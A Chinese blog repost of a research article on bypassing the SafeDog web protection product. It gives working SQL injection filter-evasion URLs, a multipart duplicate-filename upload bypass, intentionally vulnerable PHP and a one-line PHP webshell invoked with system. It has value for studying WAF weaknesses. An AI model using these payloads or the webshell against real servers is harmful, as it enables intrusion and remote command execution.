@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="色魔科技,maniac," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="一、前言    安全狗是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现安全狗的一些防护功能，例如SQL注入、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。 二、测试环境本次测试环境为 中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72 网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="全方位绕过安全狗--转载于freebuf--留作笔记">
+<meta property="og:url" content="http://maniac.vip/posts/142.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="一、前言    安全狗是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现安全狗的一些防护功能，例如SQL注入、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。 二、测试环境本次测试环境为 中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72 网站安全狗IIS版3.2.08417 三、SQL注入绕过我们先写一个存在SQL注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265659-8858-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-4402-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265660-3019-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-5275-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-1147-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-3085-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265665-8489-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-9899-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-2569-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7706-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265663-7688-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-4813-20140701.jpg">
+<meta property="og:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265664-6560-20140701.jpg">
+<meta property="og:updated_time" content="2017-11-16T07:57:27.037Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="全方位绕过安全狗--转载于freebuf--留作笔记">
+<meta name="twitter:description" content="一、前言    安全狗是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现安全狗的一些防护功能，例如SQL注入、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。 二、测试环境本次测试环境为 中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72 网站安全狗IIS版3.2.08417 三、SQL注入绕过我们先写一个存在SQL注入">
+<meta name="twitter:image" content="http://maniac.wiki/wp-content/uploads/2014/07/1457265659-8858-20140701.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/142.html"/>
+
+
+
+
+
+  <title>全方位绕过安全狗--转载于freebuf--留作笔记 | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/142.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">全方位绕过安全狗--转载于freebuf--留作笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-07-06T21:46:11+08:00">
+                2014-07-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全文章/" itemprop="url" rel="index">
+                    <span itemprop="name">安全文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/142.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/142.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p><span style="color: #00b050;">    安全狗是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现安全狗的一些防护功能，例如SQL注入、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。</span></p>
+<h1 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h1><pre><code>本次测试环境为
+</code></pre><p>中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72</p>
+<p>网站安全狗IIS版3.2.08417</p>
+<h1 id="三、SQL注入绕过"><a href="#三、SQL注入绕过" class="headerlink" title="三、SQL注入绕过"></a>三、SQL注入绕过</h1><pre><code>我们先写一个存在SQL注入漏洞的php：
+</code></pre><pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pun" style="color: #93a1a1;">&lt;?php</span><span class="pln" style="color: #48484c;">
+$uid </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> $_REQUEST</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">'id'</span><span class="pun" style="color: #93a1a1;">];</span><span class="kwd" style="color: #1e347b;">if</span><span class="pun" style="color: #93a1a1;">(!</span><span class="pln" style="color: #48484c;">$conn </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> </span><span class="lit" style="color: #195f91;">@mysql_connect</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"localhost"</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"root"</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"123456"</span><span class="pun" style="color: #93a1a1;">))</span><span class="kwd" style="color: #1e347b;">die</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">'&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.'</span><span class="pun" style="color: #93a1a1;">);</span><span class="kwd" style="color: #1e347b;">if</span><span class="pun" style="color: #93a1a1;">(!</span><span class="lit" style="color: #195f91;">@mysql_select_db</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"supe"</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;">$conn</span><span class="pun" style="color: #93a1a1;">))</span><span class="kwd" style="color: #1e347b;">die</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server."</span><span class="pun" style="color: #93a1a1;">);</span><span class="pln" style="color: #48484c;">
+$text </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"select * from supe_members where uid="</span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;">$uid</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+$rs </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> mysql_query </span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$text</span><span class="pun" style="color: #93a1a1;">,</span><span class="pln" style="color: #48484c;">$conn</span><span class="pun" style="color: #93a1a1;">);</span><span class="kwd" style="color: #1e347b;">while</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$rom </span><span class="pun" style="color: #93a1a1;">=</span><span class="pln" style="color: #48484c;"> mysql_fetch_array</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$rs</span><span class="pun" style="color: #93a1a1;">))</span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+    echo $rom</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"username"</span><span class="pun" style="color: #93a1a1;">];</span><span class="pun" style="color: #93a1a1;">}</span><span class="pun" style="color: #93a1a1;">?&gt;</span></pre>
+
+<pre><code>我用的是supesite的库，可以看到这里是有明显SQL注入漏洞的，当没有安全狗的时候可以成功注入：
+</code></pre><p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265659-8858-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265659-8858-20140701.jpg" alt="1457265659-8858-20140701"></a></p>
+<p>当安装安全狗之后，注入语句会被拦截：</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-4402-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-4402-20140701.jpg" alt="1457265661-4402-20140701"></a></p>
+<pre><code>经过测试发现，安全狗这块的匹配正则应该是s+and这类的，所以只要想办法去掉空格，用普通注释/**/是不行的，安全狗也防了这块。但是对内联注释/*!and*/这种不知道为什么安全狗没有拦截。
+</code></pre><p>用下面语句成功绕过SQL注入过滤：</p>
+<pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pln" style="color: #48484c;">http</span><span class="pun" style="color: #93a1a1;">:</span><span class="com" style="color: #93a1a1;">//192.168.200.115/inj.php?id=1/*!and*/1=2/*!union*//*!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</span></pre>
+
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265660-3019-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265660-3019-20140701.jpg" alt="1457265660-3019-20140701"></a></p>
+<p>有人说只有POST才可以，但是我测试最新版本的安全狗GET注入也是可以用这种方法绕过的。</p>
+<h1 id="四、文件上传绕过"><a href="#四、文件上传绕过" class="headerlink" title="四、文件上传绕过"></a>四、文件上传绕过</h1><pre><code>安全狗的防上传也是做在WEB层，即分析HTTP协议来防止上传，按照yuange说的安全是一个条件语句，这显然是不符合安全规范的，只检查HTTP并不能保证文件系统层上的问题。
+
+假设有一个上传功能的php：
+</code></pre><pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pun" style="color: #93a1a1;">&lt;?</span><span class="pln" style="color: #48484c;">php
+  </span><span class="kwd" style="color: #1e347b;">if</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"error"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">&gt;</span><span class="pln" style="color: #48484c;"> </span><span class="lit" style="color: #195f91;">0</span><span class="pun" style="color: #93a1a1;">)</span><span class="pln" style="color: #48484c;">
+    </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Return Code: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"error"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"&lt;br /&gt;"</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+    </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+  </span><span class="kwd" style="color: #1e347b;">else</span><span class="pln" style="color: #48484c;">
+    </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Upload: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"name"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"&lt;br /&gt;"</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Type: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"type"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"&lt;br /&gt;"</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Size: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"size"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">/</span><span class="pln" style="color: #48484c;"> </span><span class="lit" style="color: #195f91;">1024</span><span class="pun" style="color: #93a1a1;">)</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">" Kb&lt;br /&gt;"</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Temp file: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"tmp_name"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"&lt;br /&gt;"</span><span class="pun" style="color: #93a1a1;">;</span><span class="kwd" style="color: #1e347b;">if</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">file_exists</span><span class="pun" style="color: #93a1a1;">(</span><span class="str" style="color: #dd1144;">"upload/"</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"name"</span><span class="pun" style="color: #93a1a1;">]))</span><span class="pln" style="color: #48484c;">
+      </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+echo $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"name"</span><span class="pun" style="color: #93a1a1;">]</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">" already exists. "</span><span class="pun" style="color: #93a1a1;">;</span><span class="pln" style="color: #48484c;">
+      </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+    </span><span class="kwd" style="color: #1e347b;">else</span><span class="pln" style="color: #48484c;">
+      </span><span class="pun" style="color: #93a1a1;">{</span><span class="pln" style="color: #48484c;">
+move_uploaded_file</span><span class="pun" style="color: #93a1a1;">(</span><span class="pln" style="color: #48484c;">$_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"tmp_name"</span><span class="pun" style="color: #93a1a1;">],</span><span class="pln" style="color: #48484c;">
+      </span><span class="str" style="color: #dd1144;">"upload/"</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"name"</span><span class="pun" style="color: #93a1a1;">]);</span><span class="pln" style="color: #48484c;">
+echo </span><span class="str" style="color: #dd1144;">"Stored in: "</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> </span><span class="str" style="color: #dd1144;">"upload/"</span><span class="pln" style="color: #48484c;"> </span><span class="pun" style="color: #93a1a1;">.</span><span class="pln" style="color: #48484c;"> $_FILES</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">"file"</span><span class="pun" style="color: #93a1a1;">][</span><span class="str" style="color: #dd1144;">"name"</span><span class="pun" style="color: #93a1a1;">];</span><span class="pln" style="color: #48484c;">
+      </span><span class="pun" style="color: #93a1a1;">}</span><span class="pln" style="color: #48484c;">
+    </span><span class="pun" style="color: #93a1a1;">}</span><span class="pun" style="color: #93a1a1;">?&gt;</span><span class="tag">&lt;html&gt;</span><span class="tag">&lt;body&gt;</span><span class="tag">&lt;form</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">action</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"upload.php"</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">method</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"post"</span><span class="atn" style="color: teal;">enctype</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"multipart/form-data"</span><span class="tag">&gt;</span><span class="tag">&lt;label</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">for</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"file"</span><span class="tag">&gt;</span><span class="pln" style="color: #48484c;">Filename:</span><span class="tag">&lt;/label&gt;</span><span class="tag">&lt;input</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">type</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"file"</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">name</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"file"</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">id</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"file"</span><span class="pln" style="color: #48484c;"> </span><span class="tag">/&gt;</span><span class="tag">&lt;br</span><span class="pln" style="color: #48484c;"> </span><span class="tag">/&gt;</span><span class="tag">&lt;input</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">type</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"submit"</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">name</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"submit"</span><span class="pln" style="color: #48484c;"> </span><span class="atn" style="color: teal;">value</span><span class="pun" style="color: #93a1a1;">=</span><span class="atv" style="color: #dd1144;">"Submit"</span><span class="pln" style="color: #48484c;"> </span><span class="tag">/&gt;</span><span class="tag">&lt;/form&gt;</span><span class="tag">&lt;/body&gt;</span><span class="tag">&lt;/html&gt;</span></pre>
+
+<p>然后在安全狗里设置禁止上传.php文件：</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-5275-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265661-5275-20140701.jpg" alt="1457265661-5275-20140701"></a></p>
+<p>然后通过浏览器上传php会被拦截：</p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-1147-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-1147-20140701.jpg" alt="1457265662-1147-20140701"></a></p>
+<pre><code>我们通过burp把上传的HTTP包抓下来，然后自己进行一下修改POST数据。经过了一些实验，直接说结果吧，当增加一处文件名和内容，让两个文件名不一致的时候，成功绕过了安全狗的防护，上传了php文件。原因是安全狗进行文件名匹配时候用的是第一个文件名test.jpg，是复合安全要求的，但是webserver在保存文件的时候却保存了第二个文件名test.php，也就是if(security_check(a)){do(b);}，导致安全检查没有用，php文件已经成功上传了：
+</code></pre><p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-3085-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-3085-20140701.jpg" alt="1457265662-3085-20140701"></a></p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265665-8489-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265665-8489-20140701.jpg" alt="1457265665-8489-20140701"></a></p>
+<p><a href="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-9899-20140701.jpg" target="_blank" rel="noopener"><img src="http://maniac.wiki/wp-content/uploads/2014/07/1457265662-9899-20140701.jpg" alt="1457265662-9899-20140701"></a></p>
+<p>   这样的上传数据可能是不符合RFC规范的，但是却达到了绕过拦截的目的。结论是每种安全检查一定要在对应的层次做检查，而不能想当然的在WEB层做系统层该做的事情。</p>
+<h1 id="五、一句话webshell绕过"><a href="#五、一句话webshell绕过" class="headerlink" title="五、一句话webshell绕过"></a>五、一句话webshell绕过</h1><pre><code>对于攻击者来说，安全狗很烦人的一点就是传上去的webshell却不能执行。我们就来看看怎么绕过安全狗对一句话webshell的拦截。
+
+首先要知道安全狗防webshell仍然是依靠文件特征+HTTP来判断，但webshell真正执行是在脚本层，检查的层次不对当然也是可以轻易绕过去的。因为php里面函数名都可以是变量，文件里哪还有特征啊，上传如下php：
+</code></pre><pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pun" style="color: #93a1a1;">&lt;?</span><span class="pln" style="color: #48484c;">php
+$_REQUEST</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">'a'</span><span class="pun" style="color: #93a1a1;">](</span><span class="pln" style="color: #48484c;">$_REQUEST</span><span class="pun" style="color: #93a1a1;">[</span><span class="str" style="color: #dd1144;">'b'</span><span class="pun" style="color: #93a1a1;">]);</span><span class="pun" style="color: #93a1a1;">?&gt;</span></pre>
+
+<p>然后在浏览器里执行：</p>
+<pre class="prettyprint lang-php prettyprinted" style="color: #666666;"><span class="pln" style="color: #48484c;">http</span><span class="pun" style="color: #93a1a1;">:</span><span class="com" style="color: #93a1a1;">//192.168.200.115/small.php?a=system&amp;b=dir</span></pre>
+
